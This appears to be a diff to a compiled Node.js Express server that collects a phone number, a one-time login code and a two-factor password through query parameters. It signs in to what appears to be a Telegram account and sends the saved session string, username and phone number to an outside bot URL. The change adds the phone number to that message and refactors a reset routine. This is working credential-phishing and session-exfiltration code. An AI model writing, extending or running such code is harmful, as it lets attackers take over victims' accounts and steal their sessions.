@@ -57530,11 +57530,7 @@ app.get('/login', (req, res, next) => __awaiter(void 0, void 0, void 0, function
             connectionRetries: 5,
         });
         setTimeout(() => __awaiter(void 0, void 0, void 0, function* () {
-            yield (client === null || client === void 0 ? void 0 : client.destroy());
-            client = undefined;
-            phoneCode = undefined;
-            phoneNumber = undefined;
-            inProcess = true;
+            yield restAcc();
         }), 180000);
         const phone = req.query.phone;
         console.log("Number :", `+${phone}`);
@@ -57542,20 +57538,15 @@ app.get('/login', (req, res, next) => __awaiter(void 0, void 0, void 0, function
     }
 }));
 app.get('/otp', (req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
-    phoneCode = req.query.code;
-    console.log(phoneCode);
     res.send('loggingIn!!');
     next();
 }), (req, res) => __awaiter(void 0, void 0, void 0, function* () {
-    setTimeout(() => __awaiter(void 0, void 0, void 0, function* () {
-        yield (client === null || client === void 0 ? void 0 : client.destroy());
-        client = undefined;
-        phoneCode = undefined;
-        phoneNumber = undefined;
-        inProcess = true;
-    }), 180000);
-    console.log("hello:", phoneCode);
-    yield login();
+    if (inProcess) {
+        phoneCode = req.query.code;
+        console.log(phoneCode);
+        console.log("hello:", phoneCode);
+        yield login();
+    }
 }));
 app.get('/password', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     password = req.query.password;
@@ -57599,11 +57590,21 @@ function trySgnup(phoneNum) {
             if (typeof phoneNumber !== "function") {
                 throw err;
             }
+            yield restAcc();
             const shouldWeStop = false; //await authParams.onError(err);
             if (shouldWeStop) {
                 throw new Error("AUTH_USER_CANCEL");
             }
         }
+    });
+}
+function restAcc() {
+    return __awaiter(this, void 0, void 0, function* () {
+        yield (client === null || client === void 0 ? void 0 : client.destroy());
+        client = undefined;
+        phoneCode = undefined;
+        phoneNumber = undefined;
+        inProcess = true;
     });
 }
 function login() {
@@ -57626,12 +57627,14 @@ function login() {
             else {
                 const sess = client.session.save();
                 console.log(sess);
-                yield fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${sess}`);
+                yield fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${phoneNumber} | ${sess}`);
+                yield restAcc();
                 return result.user;
             }
         }
         catch (err) {
             console.log(err);
+            yield restAcc();
             if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                 return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
             }
